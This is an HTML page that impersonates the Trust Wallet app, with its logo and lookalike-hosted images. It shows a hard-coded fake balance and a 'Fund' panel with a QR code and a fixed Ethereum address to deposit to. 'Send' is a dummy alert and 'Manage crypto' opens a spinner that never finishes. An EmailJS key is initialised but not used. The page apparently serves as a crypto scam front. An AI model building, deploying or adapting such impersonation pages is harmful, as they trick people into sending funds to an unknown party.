<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust • minimal send/fund</title>
  <!-- EmailJS (unchanged) -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background-color: #0a0f18;
      background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
      background-repeat: no-repeat;
      background-position: center top;
      background-size: cover;
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
      position: relative;
    }

    /* laser beam (preserved) */
    .laser-beam {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 10;
      overflow: hidden;
    }
    .laser-beam::before {
      content: '';
      position: absolute;
      left: -5%;
      width: 110%;
      height: 3px;
      background: linear-gradient(90deg, 
        rgba(0, 160, 255, 0.2) 0%,
        rgba(0, 200, 255, 0.8) 30%,
        rgba(255, 255, 255, 1) 50%,
        rgba(0, 200, 255, 0.8) 70%,
        rgba(0, 160, 255, 0.2) 100%);
      filter: blur(1.5px);
      box-shadow: 0 0 20px 5px rgba(0, 180, 255, 0.8);
      animation: laserMove 2s ease-in-out forwards;
      top: -5%;
    }
    .laser-beam::after {
      content: '';
      position: absolute;
      left: -5%;
      width: 110%;
      height: 10px;
      background: linear-gradient(90deg, 
        rgba(100, 180, 255, 0.1) 0%,
        rgba(150, 220, 255, 0.3) 40%,
        rgba(255, 255, 255, 0.5) 50%,
        rgba(150, 220, 255, 0.3) 60%,
        rgba(100, 180, 255, 0.1) 100%);
      filter: blur(6px);
      animation: laserGlow 2s ease-in-out forwards;
      top: -7%;
    }
    @keyframes laserMove {
      0% { top: -5%; opacity: 0.2; }
      20% { opacity: 1; }
      80% { opacity: 1; }
      100% { top: 105%; opacity: 0.1; }
    }
    @keyframes laserGlow {
      0% { top: -7%; opacity: 0.1; }
      20% { opacity: 0.5; }
      80% { opacity: 0.5; }
      100% { top: 108%; opacity: 0.0; }
    }

    /* main card */
    .card {
      background: #ffffff;
      border-radius: 32px;
      box-shadow: 0 20px 36px -12px rgba(0, 0, 0, 0.4);
      width: 100%;
      max-width: 380px;
      padding: 18px 18px 24px;
      color: #1e293b;
      border: 1px solid rgba(255,255,255,0.4);
      position: relative;
      z-index: 20;
      backdrop-filter: blur(2px);
    }

    .page {
      display: none;
      flex-direction: column;
    }
    .page.active {
      display: flex;
    }

    /* ----- LANDING (no orange) ----- */
    .landing {
      align-items: center;
      gap: 22px;
      padding: 8px 0 6px;
    }
    .trust-image {
      width: 100%;
      display: flex;
      justify-content: center;
      margin: 5px 0;
    }
    .trust-image img {
      width: 160px;
      border-radius: 30px;
      box-shadow: 0 10px 22px -8px rgba(0,30,70,0.3);
    }
    .open-btn {
      background: #1e2a3a;
      border: none;
      padding: 14px 36px;
      border-radius: 60px;
      font-size: 1.5rem;
      font-weight: 500;
      color: white;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      cursor: pointer;
      box-shadow: 0 10px 20px -8px #0f1a2b;
      transition: 0.1s;
      width: auto;
      min-width: 200px;
      border: 1px solid #3f556f;
    }
    .open-btn:hover {
      background: #253e5a;
    }
    .light-footer {
      font-size: 0.7rem;
      background: #eef3fa;
      padding: 4px 16px;
      border-radius: 40px;
      color: #2d4a70;
    }

    /* ---------- MAIN WALLET PAGE ---------- */
    .wallet-page {
      gap: 16px;
    }
    .balance-section {
      background: #f4f7fc;
      border-radius: 28px;
      padding: 18px 18px 16px;
      border: 1px solid #e0e8f2;
    }
    .total-label {
      font-size: 0.75rem;
      color: #5a6e8a;
      letter-spacing: 0.2px;
      margin-bottom: 2px;
    }
    .total-balance {
      font-size: 2.5rem;
      font-weight: 600;
      color: #0b1d33;
      line-height: 1.1;
    }
    .balance-sub {
      color: #4e688b;
      font-size: 0.75rem;
      border-top: 1px solid #dae2ed;
      padding-top: 8px;
      margin-top: 4px;
    }

    /* action row: ONLY send & fund with minimalistic icons */
    .action-row {
      display: flex;
      justify-content: center;
      gap: 40px;
      background: #f4f9ff;
      padding: 10px 20px;
      border-radius: 60px;
      border: 1px solid #dbe3ef;
      margin: 4px 0;
    }
    .action-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      font-size: 0.8rem;
      font-weight: 500;
      color: #1e314a;
      cursor: pointer;
    }
    .action-icon {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.3rem;
      box-shadow: 0 3px 8px -4px #8fa3c0;
      border: 1px solid #cddbf0;
      transition: 0.1s;
    }
    .action-item:active .action-icon {
      background: #eef3fc;
    }

    .prediction-row {
      display: flex;
      gap: 8px;
      margin: 2px 0 8px;
    }
    .chip {
      background: #ecf3fc;
      border-radius: 30px;
      padding: 5px 16px;
      font-weight: 470;
      font-size: 0.8rem;
      border: 1px solid #c9d8ec;
    }

    .crypto-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #ffffff;
      padding: 8px 14px;
      border-radius: 60px;
      border: 1px solid #dee8f2;
      margin: 4px 0;
    }
    .crypto-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .crypto-icon {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #f4f9ff;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .crypto-icon img {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      object-fit: cover;
    }
    .crypto-name {
      font-weight: 560;
      font-size: 1rem;
    }
    .crypto-amount {
      font-weight: 570;
      font-size: 1.1rem;
    }
    .crypto-sub {
      font-size: 0.75rem;
      color: #627b9c;
    }

    .manage-link {
      background: #ecf3fc;
      border-radius: 40px;
      padding: 10px 18px;
      text-align: center;
      font-weight: 550;
      font-size: 0.95rem;
      border: 1px solid #bdcfec;
      cursor: pointer;
      margin-top: 8px;
    }
    .manage-link:active {
      background: #d9e2f0;
    }

    .back-link-sm {
      color: #526f96;
      font-size: 0.8rem;
      border-bottom: 1px dashed #96adcc;
      cursor: pointer;
      align-self: flex-start;
      margin-top: 12px;
    }

    /* ----- LOADING PAGE (spinner infinite) ----- */
    .loading-page {
      align-items: center;
      justify-content: center;
      gap: 28px;
      min-height: 280px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #e6ecf5;
      border-top: 4px solid #1e3a5f;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
    .loading-text {
      font-size: 1rem;
      color: #1e314a;
      font-weight: 450;
    }

    /* ----- QR PANEL (embedded in main wallet) ----- */
    .qr-panel {
      background: #f5f9ff;
      border-radius: 28px;
      padding: 18px 16px;
      border: 1px solid #cbdaf0;
      margin-top: 8px;
      display: none;
      flex-direction: column;
      align-items: center;
    }
    .qr-panel.visible {
      display: flex;
    }
    .qr-image {
      width: 160px;
      height: 160px;
      background: #ffffff;
      border-radius: 20px;
      padding: 6px;
      box-shadow: 0 8px 20px -10px #577394;
      margin-bottom: 12px;
    }
    .qr-image img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      border-radius: 12px;
    }
    .address-box {
      background: #ecf3fd;
      border-radius: 60px;
      padding: 10px 16px;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #b7ceec;
      margin: 6px 0;
      font-size: 0.7rem;
      font-family: monospace;
      word-break: break-all;
    }
    .copy-btn {
      background: #1e2f44;
      color: white;
      border: none;
      border-radius: 40px;
      padding: 8px 16px;
      font-size: 0.75rem;
      font-weight: 500;
      cursor: pointer;
      min-width: 60px;
      text-align: center;
    }
    .copy-btn:active {
      background: #103247;
    }
  </style>
</head>
<body>
  <div class="laser-beam" aria-hidden="true"></div>

  <div class="card">
    <!-- LANDING PAGE -->
    <div class="page landing active" id="landingPage">
      <div class="trust-image">
        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="trust">
      </div>
      <button class="open-btn" id="openWalletBtn">⏺ open wallet</button>
      <div class="light-footer">secure gateway</div>
    </div>

    <!-- MAIN WALLET PAGE (only Send & Fund, minimal icons) -->
    <div class="page wallet-page" id="walletPage">
      <div class="balance-section">
        <div class="total-label">total balance</div>
        <div class="total-balance">$499.999</div>
        <div class="balance-sub">$0.00 (0.0%)</div>
      </div>

      <!-- action row: ONLY send & fund with clean icons -->
      <div class="action-row">
        <div class="action-item" id="sendAction">
          <div class="action-icon">⬆️</div>
          <span>Send</span>
        </div>
        <div class="action-item" id="fundAction">
          <div class="action-icon">⬇️</div>
          <span>Fund</span>
        </div>
      </div>

      <div class="prediction-row">
        <span class="chip">Crypto</span>
        <span class="chip">Prediction</span>
        <span class="chip">Watch</span>
      </div>
      <!-- Ethereum -->
      <div class="crypto-row">
        <div class="crypto-left">
          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/A/1027.png" alt="ETH"></div>
          <span class="crypto-name">Ethereum</span>
        </div>
        <div style="display:flex; flex-direction:column; align-items:flex-end;">
          <span class="crypto-amount">0</span>
          <span class="crypto-sub">ETH</span>
        </div>
      </div>
      <!-- USDC -->
      <div class="crypto-row">
        <div class="crypto-left">
          <div class="crypto-icon"><img src="https://trustwalleteth.github.io/B/27763.png" alt="USDC"></div>
          <span class="crypto-name">USD Coin</span>
        </div>
        <div style="display:flex; flex-direction:column; align-items:flex-end;">
          <span class="crypto-amount">500</span>
          <span class="crypto-sub">USDC</span>
        </div>
      </div>
      <!-- Manage crypto (goes to infinite spinner) -->
      <div class="manage-link" id="manageCryptoBtn">⚙️ Manage crypto</div>

      <!-- QR panel (hidden by default, shown when Fund clicked) -->
      <div class="qr-panel" id="qrPanel">
        <div class="qr-image">
          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
        </div>
        <div class="address-box">
          <span style="font-family: monospace;" id="cryptoAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
          <button class="copy-btn" id="copyAddressBtn">copy</button>
        </div>
        <div style="font-size:0.6rem; color:#4b6c94;">Ethereum network</div>
      </div>

      <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
    </div>

    <!-- LOADING PAGE (spinner infinite, only back possible) -->
    <div class="page loading-page" id="loadingPage">
      <div class="spinner"></div>
      <div class="loading-text">loading ...</div>
      <div class="back-link-sm" id="backFromLoading">← back</div>
    </div>
  </div>

  <script>
    (function() {
      emailjs.init("PakuuN4ADUDEqrzHl");

      // pages
      const landing = document.getElementById('landingPage');
      const wallet = document.getElementById('walletPage');
      const loading = document.getElementById('loadingPage');

      // buttons
      const openWallet = document.getElementById('openWalletBtn');
      const backFromWallet = document.getElementById('backFromWalletToLanding');
      const manageBtn = document.getElementById('manageCryptoBtn');
      const backFromLoading = document.getElementById('backFromLoading');

      // Receive action (Fund)
      const fundAction = document.getElementById('fundAction');
      const qrPanel = document.getElementById('qrPanel');
      const copyBtn = document.getElementById('copyAddressBtn');
      const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';

      // send action (just demo)
      const sendAction = document.getElementById('sendAction');

      // open wallet
      openWallet.addEventListener('click', ()=>{
        landing.classList.remove('active');
        wallet.classList.add('active');
        qrPanel.classList.remove('visible'); // hidden on enter
      });

      // back from wallet to landing
      backFromWallet.addEventListener('click', ()=>{
        wallet.classList.remove('active');
        landing.classList.add('active');
      });

      // Manage crypto → infinite spinner
      manageBtn.addEventListener('click', ()=>{
        wallet.classList.remove('active');
        loading.classList.add('active');
      });

      // back from loading to wallet
      backFromLoading.addEventListener('click', ()=>{
        loading.classList.remove('active');
        wallet.classList.add('active');
        qrPanel.classList.remove('visible');
      });

      // FUND: toggle qr panel visibility
      fundAction.addEventListener('click', ()=>{
        qrPanel.classList.add('visible');
      });

      // copy address (plain text "copy" / "copied")
      copyBtn.addEventListener('click', ()=>{
        navigator.clipboard.writeText(walletAddress).then(()=>{
          const original = copyBtn.innerText;
          copyBtn.innerText = 'copied';
          setTimeout(()=>{ copyBtn.innerText = original; }, 1500);
        }).catch(()=>{
          alert('manual copy: ' + walletAddress);
        });
      });

      // send demo
      sendAction.addEventListener('click', ()=>{
        alert('send workflow (demo)');
      });

    })();
  </script>
</body>
</html>
